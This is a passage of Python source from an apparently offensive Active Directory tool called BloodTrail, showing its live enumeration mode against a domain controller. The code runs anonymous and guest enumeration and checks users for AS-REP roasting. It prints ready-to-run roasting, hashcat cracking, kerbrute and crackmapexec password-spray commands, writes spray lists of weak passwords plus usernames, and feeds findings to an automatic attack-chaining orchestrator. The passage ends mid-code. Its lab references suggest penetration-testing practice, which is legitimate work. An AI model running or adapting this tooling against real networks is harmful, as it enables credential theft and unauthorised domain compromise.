"""
BloodTrail Enumerate Commands

Handles live enumeration mode:
- IP address input: Run auto-enumeration against target
- --list-enumerators: List available enumeration tools
"""

import os
from argparse import Namespace
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

from ..base import BaseCommandGroup
from ..parser import InputMode, detect_input_mode
from ...logger import DebugLogger, Component, StepType

# Module-level debug logger
_logger = DebugLogger(component=Component.BLOODTRAIL)


# Patterns that suggest passwords in descriptions
SUSPICIOUS_DESC_PATTERNS = ['pass', 'pwd', 'cred', 'secret', 'key', 'login', 'token']


def _highlight_description(desc: str, red: str, reset: str) -> str:
    """Highlight descriptions containing password hints."""
    lower = desc.lower()
    for pattern in SUSPICIOUS_DESC_PATTERNS:
        if pattern in lower:
            return f"{red}{desc}{reset}"
    return desc


class EnumerateCommands(BaseCommandGroup):
    """Enumeration mode command handlers."""

    @classmethod
    def add_arguments(cls, parser) -> None:
        """Add enumerate arguments."""
        pass  # Arguments defined in cli/parser.py

    @classmethod
    def handle(cls, args: Namespace) -> int:
        """
        Handle enumerate commands.

        Returns:
            0 for success, non-zero for error, -1 if not handled
        """
        if getattr(args, 'list_enumerators', False):
            return cls._handle_list_enumerators(args)

        # Check if bh_data_dir is an IP address (enumerate mode)
        bh_data_dir = getattr(args, 'bh_data_dir', None)
        if bh_data_dir is not None:
            mode, target = detect_input_mode(str(bh_data_dir))
            if mode == InputMode.ENUMERATE:
                return cls.run_enumerate_mode(
                    target=target,
                    username=getattr(args, 'ad_username', None),
                    password=getattr(args, 'ad_password', None),
                    domain=getattr(args, 'domain', None),
                    verbose=getattr(args, 'verbose', 2),
                    show_commands=getattr(args, 'commands', False),
                    show_data=getattr(args, 'data', False),
                    interactive=getattr(args, 'interactive', False),
                    auto=getattr(args, 'auto', False),
                    auto_level=getattr(args, 'auto_level', 'high'),
                    injected_creds=getattr(args, 'cred', None),
                    max_depth=getattr(args, 'max_depth', 5),
                    cmd_timeout=getattr(args, 'cmd_timeout', 180),
                )

        return -1

    @classmethod
    def _handle_list_enumerators(cls, args: Namespace) -> int:
        """Handle --list-enumerators command."""
        from ...enumerators import list_enumerators

        print("\n[*] Available Enumeration Tools:\n")

        for enum in list_enumerators():
            status = "\033[92m[OK]\033[0m" if enum["available"] else "\033[91m[NOT INSTALLED]\033[0m"
            anon = "anonymous" if enum["anonymous"] else "requires creds"
            print(f"  {status} {enum['name']}")
            print(f"       Tool: {enum['tool']} ({anon})")
            print()

        return 0

    @classmethod
    def run_enumerate_mode(
        cls,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        verbose: int = 2,
        show_commands: bool = False,
        show_data: bool = False,
        interactive: bool = False,
        auto: bool = False,
        auto_level: str = "high",
        injected_creds: Optional[list] = None,
        max_depth: int = 5,
        cmd_timeout: int = 180,
    ) -> int:
        """
        Execute auto-enumeration mode.

        1. Discover available enumerators
        2. Run anonymous enumerators in parallel
        3. Aggregate results
        4. Display attack suggestions
        """
        from ...enumerators import get_available_enumerators
        from ...enumerators.aggregator import aggregate_results

        # Colors
        C = "\033[96m"   # Cyan
        G = "\033[92m"   # Green
        Y = "\033[93m"   # Yellow
        R = "\033[91m"   # Red
        B = "\033[1m"    # Bold
        D = "\033[2m"    # Dim
        X = "\033[0m"    # Reset

        _logger.info("Starting enumerate mode", StepType.ENUMERATION,
                     target=target, username=username, domain=domain)

        print()
        print(f"{C}{B}{'=' * 74}{X}")
        print(f"{C}{B}  BloodTrail Enumerate Mode - Pre-Auth Attack Discovery{X}")
        print(f"{C}{B}{'=' * 74}{X}")
        print()
        print(f"  {D}Target:{X}       {B}{target}{X}")

        if username:
            print(f"  {D}Username:{X}     {B}{username}{X}")
            print(f"  {D}Auth level:{X}   {B}Authenticated{X}")
        else:
            print(f"  {D}Auth level:{X}   {B}Anonymous{X}")

        # Pre-flight domain detection if not provided
        if not domain:
            from ...enumerators.domain_detect import detect_domain

            print(f"  {D}Domain:{X}       {Y}detecting...{X}", end="", flush=True)
            domain_info = detect_domain(target, timeout=10)

            if domain_info.domain:
                domain = domain_info.domain
                _logger.info("Domain detected", StepType.ENUMERATION,
                             domain=domain, method=domain_info.detection_method)
                print(f"\r  {D}Domain:{X}       {B}{domain}{X} {D}(via {domain_info.detection_method}){X}")
            else:
                _logger.warning("Domain not detected", StepType.ENUMERATION, target=target)
                print(f"\r  {D}Domain:{X}       {Y}not detected (use --domain){X}")
        else:
            print(f"  {D}Domain:{X}       {B}{domain}{X}")

        print()

        # Get available enumerators
        enumerators = get_available_enumerators(
            anonymous_only=not bool(username),
            require_installed=True
        )

        if not enumerators:
            cls.print_error("No enumeration tools available.")
            print(f"    Install: enum4linux-ng, ldapsearch, or kerbrute")
            return 1

        # Print commands if verbose (-v or higher)
        if verbose >= 1:
            print(f"[*] Commands to execute:")
            print()

            # Phase 1 enumerators
            for i, enum in enumerate(enumerators, 1):
                cmd, desc = enum.get_command(
                    target=target,
                    username=username,
                    password=password,
                    domain=domain,
                )
                if cmd:
                    print(f"  {i}. {' '.join(cmd)}")
                    print(f"     {D}- {desc}{X}")
                    print()

            # Phase 2 preview (GetNPUsers) - runs after user discovery
            from ...enumerators.getnpusers import GetNPUsersEnumerator
            getnp_preview = GetNPUsersEnumerator()
            if getnp_preview.is_available():
                cmd, desc = getnp_preview.get_command(
                    target=target,
                    domain=domain,
                    user_list=["<discovered>"],
                )
                print(f"  {len(enumerators) + 1}. {' '.join(cmd)}  {D}[Phase 2]{X}")
                print(f"     {D}- {desc}{X}")
                print()

        print(f"[*] Running {len(enumerators)} enumerator(s)...")
        print()

        # Run in parallel
        results = []
        try:
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = {}
                for enum in enumerators:
                    _logger.verbose("Starting enumerator", StepType.TOOL_CALL,
                                    tool=enum.name, target=target)
                    future = executor.submit(
                        enum.run,
                        target=target,
                        username=username,
                        password=password,
                        timeout=300,
                        domain=domain,
                        verbose=verbose,
                    )
                    futures[future] = enum

                for future in as_completed(futures):
                    enum = futures[future]
                    try:
                        result = future.result()
                        results.append(result)

                        if result.success:
                            _logger.info("Enumerator completed", StepType.TOOL_CALL,
                                         tool=enum.name, duration=result.duration_seconds,
                                         users=len(result.users) if result.users else 0)
                            print(f"  {G}[OK]{X} {enum.name}: {result.duration_seconds:.1f}s")
                            if verbose >= 1 and result.users:
                                print(f"       Found {len(result.users)} users")
                        else:
                            _logger.warning("Enumerator failed", StepType.TOOL_CALL,
                                            tool=enum.name, error=result.error)
                            print(f"  {R}[FAIL]{X} {enum.name}: {result.error or 'Unknown error'}")

                    except Exception as e:
                        _logger.error("Enumerator exception", StepType.TOOL_CALL,
                                      tool=enum.name, error=str(e))
                        print(f"  {R}[ERR]{X} {enum.name}: {e}")
        except KeyboardInterrupt:
            print(f"\n  {Y}[!] Interrupted - cancelling enumeration{X}")
            return 1

        # Aggregate results
        print()
        aggregated = aggregate_results(results)

        # Use provided domain or detected
        if domain:
            aggregated.domain = domain.upper()

        # Guest account fallback: If anonymous failed to find users, try guest:''
        # This is common on newer AD (Cicada pattern - guest access lists shares)
        if not username and len(aggregated.users) < 3:
            from ...enumerators.guest_probe import try_guest_access

            print(f"[*] Few users found anonymously, probing guest account...")
            guest_result = try_guest_access(target, domain, timeout=60)

            if guest_result["success"]:
                print(f"  {G}[OK]{X} Guest SMB access works (guest:'')")
                if guest_result["shares"]:
                    print(f"       Accessible shares: {len(guest_result['shares'])}")
                    for share in guest_result["shares"][:5]:
                        access = share.get('access', share.get('type', ''))
                        print(f"         - {share['name']} ({access})")

                # Store guest credential in aggregated for later use
                aggregated.metadata["guest_access"] = True
                aggregated.metadata["guest_shares"] = guest_result["shares"]
            else:
                print(f"  {D}[INFO]{X} Guest access: {guest_result.get('error', 'denied')}")
            print()

        # Debug: Show AS-REP users found in Phase 1
        if verbose >= 2:
            asrep_users = [u["name"] for u in aggregated.users.values() if u.get("asrep")]
            if asrep_users:
                print(f"  {D}[Phase 1] Found {len(asrep_users)} AS-REP users: {asrep_users}{X}")
            else:
                print(f"  {D}[Phase 1] No AS-REP users detected yet (will check in Phase 2){X}")
            print()

        # Phase 2: Run GetNPUsers AS-REP check with discovered users
        discovered_users = [u["name"] for u in aggregated.users.values()]
        has_asrep = any(u.get("asrep") for u in aggregated.users.values())

        if discovered_users and not has_asrep:
            from ...enumerators.getnpusers import GetNPUsersEnumerator

            getnp = GetNPUsersEnumerator()
            if getnp.is_available():
                print(f"[*] Phase 2: Testing {len(discovered_users)} users for AS-REP...")

                # Print command if verbose (-v or higher)
                if verbose >= 1:
                    cmd, desc = getnp.get_command(
                        target=target,
                        domain=aggregated.domain or domain,
                        user_list=discovered_users,
                    )
                    print(f"    {' '.join(cmd)}")
                    print(f"    {D}- {desc}{X}")
                print()

                asrep_result = getnp.run(
                    target=target,
                    domain=aggregated.domain or domain,
                    user_list=discovered_users,
                    timeout=120,
                )

                if asrep_result.success:
                    asrep_found = [u for u in asrep_result.users if u.get("asrep")]
                    if asrep_found:
                        print(f"  {G}[OK]{X} GetNPUsers AS-REP: {asrep_result.duration_seconds:.1f}s")
                        print(f"       Found {len(asrep_found)} AS-REP roastable user(s)")

                        # Merge AS-REP results into aggregated
                        for user in asrep_result.users:
                            key = user["name"].lower()
                            if key in aggregated.users:
                                aggregated.users[key]["asrep"] = user.get("asrep", False)
                                if user.get("asrep_hash"):
                                    aggregated.users[key]["asrep_hash"] = user["asrep_hash"]
                            elif user.get("asrep"):
                                # User not in list but AS-REP roastable - add them
                                aggregated.users[key] = user
                    else:
                        print(f"  {D}[OK]{X} GetNPUsers AS-REP: No vulnerable users")
                else:
                    print(f"  {Y}[SKIP]{X} GetNPUsers: {asrep_result.error or 'Failed'}")

                print()

        # Display control logic (following -d/-c patterns from main module)
        show_all = not show_commands and not show_data

        # Quick summary (always shown)
        print(f"  {D}Domain:{X}       {B}{aggregated.domain or 'Unknown'}{X}")
        print(f"  {D}Users:{X}        {B}{len(aggregated.users)}{X}")
        print(f"  {D}Computers:{X}    {B}{len(aggregated.computers)}{X}")
        print(f"  {D}Groups:{X}       {B}{len(aggregated.groups)}{X}")

        # Compute output directory path (deterministic from target)
        output_dir = f"./enum_{target.replace('.', '_')}"

        # Display data inventory
        if show_all or show_data:
            cls._print_data_inventory(aggregated, target, verbose)

        # Display attack commands (with actual file paths)
        if show_all or show_commands:
            cls._print_attack_commands(aggregated, target, output_dir)

        # Auto-run service account analysis (integrated flow)
        cls._run_service_account_analysis(aggregated, target, domain)

        # Process findings through recommendation engine
        cls._process_recommendations(
            aggregated=aggregated,
            target=target,
            domain=domain,
            username=username,
            password=password,
            interactive=interactive,
            auto=auto,
            auto_level=auto_level,
            injected_creds=injected_creds,
            max_depth=max_depth,
            cmd_timeout=cmd_timeout,
        )

        # Generate files (uses pre-computed output_dir)
        cls._generate_enum_files(aggregated, target, output_dir)
        print(f"  {D}Files saved to:{X} {B}{output_dir}/{X}")
        print()

        print(f"{C}{'=' * 74}{X}")
        print()

        return 0

    @classmethod
    def _print_data_inventory(cls, aggregated, target: str, verbose: int = 2) -> None:
        """Print data inventory section (users, computers, groups, shares)."""
        # Colors
        C = "\033[96m"   # Cyan
        G = "\033[92m"   # Green
        Y = "\033[93m"   # Yellow
        R = "\033[91m"   # Red
        B = "\033[1m"    # Bold
        D = "\033[2m"    # Dim
        X = "\033[0m"    # Reset

        print()
        print(f"{C}{B}{'=' * 74}{X}")
        print(f"{C}{B}  DATA INVENTORY{X}")
        print(f"{C}{B}{'=' * 74}{X}")
        print()

        # Domain info
        print(f"  {B}DOMAIN INFO{X}")
        print(f"  {D}{'─' * 60}{X}")
        print(f"    Domain:     {B}{aggregated.domain or 'Unknown'}{X}")
        if aggregated.dc_hostname:
            print(f"    DC:         {B}{aggregated.dc_hostname}{X} ({target})")
        else:
            print(f"    DC IP:      {B}{target}{X}")
        print()

        # Users with descriptions
        enabled_users = [u for u in aggregated.users.values() if u.get('enabled', True)]
        print(f"  {B}USERS ({len(enabled_users)} enabled){X}")
        print(f"  {D}{'─' * 60}{X}")

        # Sort by name
        sorted_users = sorted(enabled_users, key=lambda u: u.get('name', '').lower())
        display_limit = 30 if verbose >= 1 else 15

        for user in sorted_users[:display_limit]:
            name = user.get('name', 'unknown')
            desc = user.get('description', '')

            # Service account tag
            svc_tag = f"{Y}[SVC]{X}" if user.get('is_service') else "     "

            # Format description (truncate if needed)
            if desc:
                desc = desc[:40] + "..." if len(desc) > 40 else desc
                desc = _highlight_description(desc, R, X)
                print(f"    {svc_tag} {name:<20} {D}{desc}{X}")
            else:
                print(f"    {svc_tag} {name}")

        if len(sorted_users) > display_limit:
            print(f"    {D}... and {len(sorted_users) - display_limit} more (use -v for full list){X}")
        print()

        # Dangerous flags section
        pwnotreq_users = [u for u in enabled_users if u.get('pwnotreq')]
        pwnoexp_users = [u for u in enabled_users if u.get('pwnoexp')]
        asrep_users = [u for u in enabled_users if u.get('asrep')]
        spn_users = [u for u in enabled_users if u.get('spn')]

        if pwnotreq_users or pwnoexp_users or asrep_users:
            print(f"  {R}{B}DANGEROUS FLAGS{X}")
            print(f"  {D}{'─' * 60}{X}")

            for user in asrep_users:
                print(f"    {R}{user['name']:<20} [ASREP]    AS-REP roastable (no preauth){X}")

            for user in pwnotreq_users:
                print(f"    {R}{user['name']:<20} [PWNOTREQ] Password not required!{X}")

            for user in pwnoexp_users[:5]:  # Limit these as often many
                print(f"    {Y}{user['name']:<20} [PWNOEXP]  Password never expires{X}")

            if len(pwnoexp_users) > 5:
                print(f"    {D}... and {len(pwnoexp_users) - 5} more with PWNOEXP{X}")
            print()

        # Kerberoastable users
        if spn_users:
            print(f"  {Y}{B}KERBEROASTABLE USERS ({len(spn_users)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for user in spn_users[:10]:
                spns = user.get('spns', [])
                spn_str = spns[0] if spns else 'SPN set'
                if len(spns) > 1:
                    spn_str += f" (+{len(spns)-1} more)"
                print(f"    {Y}{user['name']:<20}{X} {D}{spn_str}{X}")
            if len(spn_users) > 10:
                print(f"    {D}... and {len(spn_users) - 10} more{X}")
            print()

        # Computers
        if aggregated.computers:
            print(f"  {B}COMPUTERS ({len(aggregated.computers)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            sorted_computers = sorted(aggregated.computers.values(), key=lambda c: c.get('name', '').lower())
            for comp in sorted_computers[:10]:
                name = comp.get('name', 'unknown')
                os_info = comp.get('os', '')
                if os_info:
                    print(f"    {name:<16} {D}{os_info}{X}")
                else:
                    print(f"    {name}")
            if len(sorted_computers) > 10:
                print(f"    {D}... and {len(sorted_computers) - 10} more{X}")
            print()

        # Groups (notable ones)
        if aggregated.groups:
            notable_groups = ['domain admins', 'enterprise admins', 'administrators',
                             'account operators', 'backup operators', 'server operators',
                             'exchange windows permissions', 'dnsadmins']
            groups_list = list(aggregated.groups.values())
            notable = [g for g in groups_list if g.get('name', '').lower() in notable_groups]
            other_count = len(groups_list) - len(notable)

            print(f"  {B}GROUPS ({len(groups_list)}) - Notable{X}")
            print(f"  {D}{'─' * 60}{X}")
            for group in notable:
                print(f"    {group.get('name', 'unknown')}")
            if other_count > 0:
                print(f"    {D}... and {other_count} other groups{X}")
            print()

        # Shares
        if aggregated.shares:
            print(f"  {B}SHARES ({len(aggregated.shares)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for share in list(aggregated.shares.values())[:10]:
                name = share.get('name', 'unknown')
                stype = share.get('type', '')
                print(f"    {name:<16} {D}({stype}){X}" if stype else f"    {name}")
            print()

        # Password Policy
        if aggregated.password_policy:
            policy = aggregated.password_policy
            print(f"  {B}PASSWORD POLICY{X}")
            print(f"  {D}{'─' * 60}{X}")
            print(f"    Min Length:      {policy.get('min_length', 'N/A')}")

            complexity = policy.get('complexity')
            if complexity is not None:
                print(f"    Complexity:      {'Enabled' if complexity else f'{R}DISABLED{X}'}")

            lockout = policy.get('lockout_threshold', 0)
            if lockout == 0:
                print(f"    Lockout:         {R}None (unlimited spray!){X}")
            else:
                print(f"    Lockout:         {lockout} attempts")
                window = policy.get('lockout_window', 30)
                print(f"    Window:          {window} minutes")
            print()

    @classmethod
    def _print_attack_commands(cls, aggregated, target: str, output_dir: str = None) -> None:
        """Print attack command suggestions with actual file paths."""
        # Colors
        C = "\033[96m"   # Cyan
        G = "\033[92m"   # Green
        Y = "\033[93m"   # Yellow
        R = "\033[91m"   # Red
        B = "\033[1m"    # Bold
        D = "\033[2m"    # Dim
        X = "\033[0m"    # Reset

        print()
        print(f"{C}{B}{'=' * 74}{X}")
        print(f"{C}{B}  ATTACK COMMANDS{X}")
        print(f"{C}{B}{'=' * 74}{X}")
        print()

        domain_lower = (aggregated.domain or "DOMAIN").lower()
        asrep_users = aggregated.asrep_roastable_users
        spn_users = [u for u in aggregated.users.values() if u.get('spn') and u.get('enabled', True)]

        # AS-REP Roasting
        if asrep_users:
            asrep_file = f"{output_dir}/asrep_targets.txt" if output_dir else "asrep_targets.txt"
            print(f"  {R}{B}AS-REP ROASTING ({len(asrep_users)} target{'s' if len(asrep_users) > 1 else ''}){X}")
            print(f"  {D}{'─' * 60}{X}")
            print(f"  {D}Targets: {asrep_file}{X}")
            for user in asrep_users[:3]:
                cmd = f"impacket-GetNPUsers -dc-ip {target} -request -no-pass {domain_lower}/{user['name']}"
                print(f"  {G}{cmd}{X}")
            if len(asrep_users) > 3:
                print(f"  {D}... and {len(asrep_users) - 3} more (see {asrep_file}){X}")
            print()
            print(f"  {D}Post-success:{X}")
            print(f"  {G}hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt{X}")
            print()

        # Kerberoasting
        if spn_users:
            kerb_file = f"{output_dir}/kerberoast_targets.txt" if output_dir else "kerberoast_targets.txt"
            print(f"  {Y}{B}KERBEROASTING ({len(spn_users)} target{'s' if len(spn_users) > 1 else ''}){X}")
            print(f"  {D}{'─' * 60}{X}")
            print(f"  {D}Targets: {kerb_file}{X}")
            print(f"  {D}Requires valid credentials:{X}")
            print(f"  {G}impacket-GetUserSPNs -dc-ip {target} {domain_lower}/USER:PASS -request{X}")
            print()
            print(f"  {D}Post-success:{X}")
            print(f"  {G}hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt{X}")
            print()

        # Password Spray
        policy = aggregated.password_policy
        lockout = policy.get('lockout_threshold', 0) if policy else 0

        # Calculate spray stats
        enabled_users = [u for u in aggregated.users.values() if u.get('enabled', True)]
        real_users = [u for u in enabled_users if not u.get('is_service')]
        num_users = len(real_users)
        # Password count: 16 common + domain-based (2 if domain) + all usernames
        num_common_passwords = 16 + (2 if aggregated.domain else 0)
        num_passwords = num_common_passwords + len(enabled_users)
        total_combos = num_users * num_passwords

        print(f"  {B}PASSWORD SPRAY{X}")
        print(f"  {D}{'─' * 60}{X}")

        if lockout == 0:
            print(f"  {R}WARNING: No lockout policy detected - spray with caution!{X}")
        else:
            safe = aggregated.spray_safe_attempts
            window = policy.get('lockout_window', 30) if policy else 30
            print(f"  {D}Safe attempts: {safe} per {window} min window{X}")

        print()
        # Use actual file paths if output_dir provided
        user_file = f"{output_dir}/users_real.txt" if output_dir else "users.txt"
        pass_file = f"{output_dir}/passwords.txt" if output_dir else "passwords.txt"

        print(f"  {D}# Spray stats: {num_users} users × {num_passwords} passwords = {total_combos:,} combinations{X}")
        print(f"  {D}# Password list includes usernames (username-as-password attack){X}")
        print(f"  {D}# See: {pass_file}{X}")
        print()
        print(f"  {D}# Kerbrute (Kerberos - stealthier, single password):{X}")
        print(f"  {G}kerbrute passwordspray -d {domain_lower} --dc {target} {user_file} 'Password1'{X}")
        print()
        print(f"  {D}# CrackMapExec (SMB - full matrix, 10 threads):{X}")
        print(f"  {G}crackmapexec -t 10 smb {target} -u {user_file} -p {pass_file} --continue-on-success{X}")
        print()

        # Post-success actions
        print(f"  {B}POST-SUCCESS{X}")
        print(f"  {D}{'─' * 60}{X}")
        print(f"  {D}# With valid creds, BloodHound collection:{X}")

        # Get DC hostname from computers
        dc_hostname = None
        for comp in aggregated.computers.values():
            name = comp.get('name', '')
            if name:
                dc_hostname = f"{name.lower()}.{domain_lower}"
                break

        if dc_hostname:
            print(f"  {G}bloodhound-python -d {domain_lower} -u USER -p PASS -c All -ns {target} -dc {dc_hostname}{X}")
            print()
            print(f"  {D}# Or add to /etc/hosts:{X}")
            print(f"  {G}echo \"{target} {dc_hostname}\" | sudo tee -a /etc/hosts{X}")
        else:
            print(f"  {G}bloodhound-python -d {domain_lower} -u USER -p PASS -c All -ns {target}{X}")
        print()

    @classmethod
    def _generate_enum_files(cls, aggregated, target: str, output_dir: str = None) -> str:
        """Generate enumeration output files."""
        # Create output directory
        if output_dir is None:
            output_dir = f"./enum_{target.replace('.', '_')}"

        os.makedirs(output_dir, exist_ok=True)

        enabled_users = [u for u in aggregated.users.values() if u.get('enabled', True)]

        # users_all.txt - all enabled users
        with open(os.path.join(output_dir, "users_all.txt"), "w") as f:
            for user in sorted(enabled_users, key=lambda u: u.get('name', '').lower()):
                f.write(user.get('name', '') + "\n")

        # users_real.txt - non-service accounts (for spray)
        real_users = [u for u in enabled_users if not u.get('is_service')]
        with open(os.path.join(output_dir, "users_real.txt"), "w") as f:
            for user in sorted(real_users, key=lambda u: u.get('name', '').lower()):
                f.write(user.get('name', '') + "\n")

        # users_service.txt - service accounts
        service_users = [u for u in enabled_users if u.get('is_service')]
        with open(os.path.join(output_dir, "users_service.txt"), "w") as f:
            for user in sorted(service_users, key=lambda u: u.get('name', '').lower()):
                f.write(user.get('name', '') + "\n")

        # asrep_targets.txt - AS-REP roastable
        asrep_users = aggregated.asrep_roastable_users
        with open(os.path.join(output_dir, "asrep_targets.txt"), "w") as f:
            for user in asrep_users:
                f.write(user.get('name', '') + "\n")

        # kerberoast_targets.txt - users with SPNs
        spn_users = [u for u in enabled_users if u.get('spn')]
        with open(os.path.join(output_dir, "kerberoast_targets.txt"), "w") as f:
            for user in spn_users:
                f.write(user.get('name', '') + "\n")

        # passwords.txt - common passwords + usernames (for username-as-password attacks)
        # Based on Monteverde writeup: "having a password of the username is unfortunately common"
        common_passwords = [
            # Statistically likely weak corporate passwords
            "Password1",
            "Password123",
            "Welcome1",
            "Welcome123",
            "Letmein1",
            "Letmein123",
            "Changeme1",
            "Changeme123",
            "P@ssw0rd",
            "P@ssword1",
            "Company1",
            "Company123",
            "Summer2024",
            "Winter2024",
            "Spring2024",
            "Fall2024",
        ]
        # Add domain-based passwords if domain is known
        domain = aggregated.domain
        if domain:
            domain_base = domain.split('.')[0].lower()
            common_passwords.extend([
                f"{domain_base.capitalize()}1",
                f"{domain_base.capitalize()}123",
                f"{domain_base}1",
                f"{domain_base}123",
            ])

        with open(os.path.join(output_dir, "passwords.txt"), "w") as f:
            # Write common passwords first
            for pwd in common_passwords:
                f.write(pwd + "\n")
            # Append all usernames (username-as-password attack)
            for user in sorted(enabled_users, key=lambda u: u.get('name', '').lower()):
                username = user.get('name', '')
                if username:
                    f.write(username + "\n")

        # computers.txt - computer names
        with open(os.path.join(output_dir, "computers.txt"), "w") as f:
            for comp in sorted(aggregated.computers.values(), key=lambda c: c.get('name', '').lower()):
                f.write(comp.get('name', '') + "\n")

        # domain_info.txt - summary
        with open(os.path.join(output_dir, "domain_info.txt"), "w") as f:
            f.write(f"Domain: {aggregated.domain or 'Unknown'}\n")
            f.write(f"DC IP: {aggregated.dc_ip or target}\n")
            if aggregated.dc_hostname:
                f.write(f"DC Hostname: {aggregated.dc_hostname}\n")
            f.write(f"\n")
            f.write(f"Users: {len(enabled_users)}\n")
            f.write(f"  - AS-REP Roastable: {len(asrep_users)}\n")
            f.write(f"  - Kerberoastable: {len(spn_users)}\n")
            f.write(f"  - Service Accounts: {len(service_users)}\n")
            f.write(f"Computers: {len(aggregated.computers)}\n")
            f.write(f"Groups: {len(aggregated.groups)}\n")

            if aggregated.password_policy:
                policy = aggregated.password_policy
                f.write(f"\nPassword Policy:\n")
                f.write(f"  Min Length: {policy.get('min_length', 'N/A')}\n")
                f.write(f"  Complexity: {'Enabled' if policy.get('complexity') else 'DISABLED'}\n")
                lockout = policy.get('lockout_threshold', 0)
                if lockout == 0:
                    f.write(f"  Lockout: None\n")
                else:
                    f.write(f"  Lockout: {lockout} attempts\n")

        return output_dir

    @classmethod
    def _run_service_account_analysis(cls, aggregated, target: str, domain: str = None) -> None:
        """
        Automatically run service account analysis on discovered users.

        This provides prioritized attack suggestions without requiring --analyze-svc flag.
        """
        from ...core.service_accounts import ServiceAccountAnalyzer, AttackVector

        # Colors
        C = "\033[96m"   # Cyan
        G = "\033[92m"   # Green
        Y = "\033[93m"   # Yellow
        R = "\033[91m"   # Red
        B = "\033[1m"    # Bold
        D = "\033[2m"    # Dim
        X = "\033[0m"    # Reset

        # Convert aggregated users to format expected by analyzer
        users = list(aggregated.users.values())
        if not users:
            return

        context = {
            "target_ip": target,
            "domain": domain or aggregated.domain or "",
        }

        analyzer = ServiceAccountAnalyzer()
        result = analyzer.analyze_from_users(users, context)

        # Only show if we found interesting accounts
        if not result.all_accounts:
            return

        # Check for critical/high priority or password-in-description
        pwd_in_desc = [a for a in result.all_accounts if AttackVector.PASSWORD_IN_DESC in a.attack_vectors]
        high_priority = result.high_priority

        if not pwd_in_desc and not high_priority:
            # Just show count of detected service accounts
            print()
            print(f"  {D}Service accounts detected:{X} {B}{len(result.all_accounts)}{X} {D}(use --analyze-svc for details){X}")
            return

        # Show critical findings prominently
        print()
        print(f"{C}{B}{'=' * 74}{X}")
        print(f"{C}{B}  SERVICE ACCOUNT ANALYSIS (Auto-Detected){X}")
        print(f"{C}{B}{'=' * 74}{X}")
        print()

        # Password in description - CRITICAL
        if pwd_in_desc:
            print(f"  {R}{B}PASSWORD IN DESCRIPTION ({len(pwd_in_desc)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for account in pwd_in_desc[:5]:
                print(f"    {R}{account.name}{X}")
                print(f"      {D}Attack: {account.attack_suggestion}{X}")
            print()

        # Critical priority
        if result.critical:
            print(f"  {R}{B}CRITICAL PRIORITY ({len(result.critical)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for account in result.critical[:5]:
                vectors = ", ".join(v.value for v in account.attack_vectors)
                print(f"    {R}{account.name}{X} - {vectors}")
                print(f"      {D}{account.attack_suggestion}{X}")
            print()

        # High priority
        if result.high:
            print(f"  {Y}{B}HIGH PRIORITY ({len(result.high)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for account in result.high[:5]:
                vectors = ", ".join(v.value for v in account.attack_vectors)
                print(f"    {Y}{account.name}{X} - {vectors}")
            if len(result.high) > 5:
                print(f"    {D}... and {len(result.high) - 5} more{X}")
            print()

        # Next steps
        if result.next_steps:
            print(f"  {B}RECOMMENDED ACTIONS{X}")
            print(f"  {D}{'─' * 60}{X}")
            for step in result.next_steps[:3]:
                print(f"    {G}$ {step['command']}{X}")
                print(f"      {D}{step['explanation']}{X}")
            print()

    @classmethod
    def _process_recommendations(
        cls,
        aggregated,
        target: str,
        domain: Optional[str] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
        interactive: bool = False,
        auto: bool = False,
        auto_level: str = "high",
        injected_creds: Optional[list] = None,
        max_depth: int = 5,
        cmd_timeout: int = 180,
    ) -> None:
        """
        Process findings through the recommendation engine.

        In non-interactive mode: displays prioritized recommendations
        In interactive mode: runs the interactive session for guided attack
        In auto mode: runs the auto-orchestrator for automatic attack chaining
        """
        from ...recommendation import (
            RecommendationEngine,
            findings_from_enumeration,
            RecommendationPriority,
        )

        # Colors
        C = "\033[96m"
        G = "\033[92m"
        Y = "\033[93m"
        R = "\033[91m"
        B = "\033[1m"
        D = "\033[2m"
        X = "\033[0m"

        # Create recommendation engine
        engine = RecommendationEngine(
            target=target,
            domain=domain or aggregated.domain,
        )

        # If we have credentials, add them
        if username and password:
            engine.add_credential(
                username=username,
                password=password,
                validated=True,
                access_level="user",
            )

        # Convert enumeration results to findings
        findings = findings_from_enumeration(aggregated)

        # Add findings to engine (this triggers recommendation generation)
        for finding in findings:
            engine.add_finding(finding)

        # AUTO MODE: Use orchestrator for automatic attack chaining
        if auto:
            from ...auto import AutoOrchestrator

            # Parse priority level
            priority_map = {
                "critical": RecommendationPriority.CRITICAL,
                "high": RecommendationPriority.HIGH,
                "medium": RecommendationPriority.MEDIUM,
            }
            auto_priority = priority_map.get(auto_level, RecommendationPriority.HIGH)

            # Parse injected credentials (format: USER:PASS)
            initial_creds = []
            if injected_creds:
                for cred_str in injected_creds:
                    if ':' in cred_str:
                        cred_user, cred_pass = cred_str.split(':', 1)
                        initial_creds.append({
                            "username": cred_user,
                            "password": cred_pass,
                            "validated": True,
                        })

            # Create orchestrator with existing engine
            orchestrator = AutoOrchestrator(
                target=target,
                domain=domain or aggregated.domain,
                auto_level=auto_priority,
                max_depth=max_depth,
                timeout=cmd_timeout,
                initial_credentials=initial_creds,
            )

            # Transfer findings from our engine to orchestrator's engine
            for finding in findings:
                orchestrator.engine.add_finding(finding)

            # If guest access works, add it and trigger SMB crawl
            if aggregated.metadata.get("guest_access"):
                from ...recommendation.models import Finding, FindingType
                from ...recommendation.triggers import create_smb_crawl_recommendation

                # Add guest credential to engine
                orchestrator.engine.add_credential(
                    username="guest",
                    password="",
                    validated=True,
                    access_level="guest",
                )
                print(f"  {G}[+]{X} Guest credential added for SMB crawl")

                # Create SMB crawl recommendation for guest shares
                guest_shares = aggregated.metadata.get("guest_shares", [])
                if guest_shares:
                    # Create a finding for guest SMB access
                    guest_finding = Finding(
                        id="guest_smb_access",
                        finding_type=FindingType.CREDENTIAL,
                        source="enumeration",
                        target="guest_smb",
                        raw_value="guest:''",
                        tags=["validated", "guest_access"],
                        metadata={
